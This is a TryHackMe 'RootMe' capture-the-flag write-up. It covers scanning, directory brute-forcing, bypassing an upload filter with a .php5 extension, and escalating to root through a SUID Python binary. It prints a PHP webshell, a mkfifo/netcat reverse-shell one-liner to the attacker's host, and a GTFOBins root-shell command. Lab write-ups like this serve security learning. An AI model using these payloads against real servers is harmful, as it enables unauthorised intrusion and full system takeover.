# TryHackMe – RootMe

**Completed:** *November 18th, 2025*  
**Platform:** TryHackMe  
> ⚠️ This write-up is for educational purposes only. All activity was conducted within legal lab environments.

This CTF focused on gaining access to a vulnerable web server via a file upload bypass and escalating privileges through a misconfigured SUID binary.

---

## 🎯 Target: Linux Web Server

### 🔍 Nmap Scan

~~~bash
nmap -sS -sV -sC -T4 <IP>
~~~

**Explanation:** Performs a TCP SYN scan with service/version detection and default NSE scripts at high speed.

**Result:**
~~~
22/tcp open   ssh
80/tcp open   http  Apache httpd
~~~

---

## 🌐 Web Enumeration

Performed manual inspection of the website — very basic static content, no clear entry points. Moved on to directory brute-forcing.

~~~bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
~~~

**Result:** Discovered two key directories:
- `/panel` — file upload interface  
- `/uploads` — publicly accessible upload directory

---

## 📤 File Upload Bypass

Visited `/panel` and tested uploading a basic PHP webshell:

~~~php
<?php system($_GET["cmd"]); ?>
~~~

Initial upload attempt failed — likely due to file extension filtering.

Tested:
- `.php` → blocked  
- `.png.php` → blocked  
- `.php5` → ✅ **successfully uploaded**

---

## 🐚 Gaining a Shell

Accessed the uploaded webshell via:

http://<IP>/uploads/shell.php5?cmd=


Set up a Netcat listener:

~~~bash
nc -lvnp 4444
~~~

Attempted this reverse shell payload:

~~~bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
~~~

It failed due to special characters. Fixed it using [urlencoder.io](https://www.urlencoder.io/), and it worked.

✅ **Result:** Gained a reverse shell as a low-privileged user.

---

## 🧭 Post-Exploitation Enumeration

Performed basic enumeration of the system.

Found the first flag:

~~~bash
cat /home/<user>/user.txt
~~~

✅ **User flag captured.**

---

## 🔓 Privilege Escalation

Checked for SUID binaries:

~~~bash
find / -perm -4000 -type f 2>/dev/null
~~~

**Result:** Found Python with the SUID bit set:

/usr/bin/python


Searched GTFOBins and used the following command:

~~~bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
~~~

✅ **Root shell obtained.**

Retrieved root flag:

~~~bash
cat /root/root.txt
~~~

✅ **Root flag captured.**

---

## 🧠 Summary

| Phase | Key Finding |
|-------|-------------|
| Web Enumeration | Discovered `/panel` and `/uploads` |
| Exploitation | Bypassed file upload filter using `.php5` |
| Shell Access | Gained reverse shell via encoded webshell payload |
| Privilege Escalation | SUID Python binary abused for root |
| Outcome | Full compromise + both flags captured |

---

## 💡 Lessons Learned

- File upload filters can often be bypassed using lesser-known extensions like `.php5`  
- Public upload directories paired with weak validation are high-risk entry points  
- GTFOBins is an essential resource for privilege escalation  
- Always test multiple payload delivery methods — URL encoding made the reverse shell work  
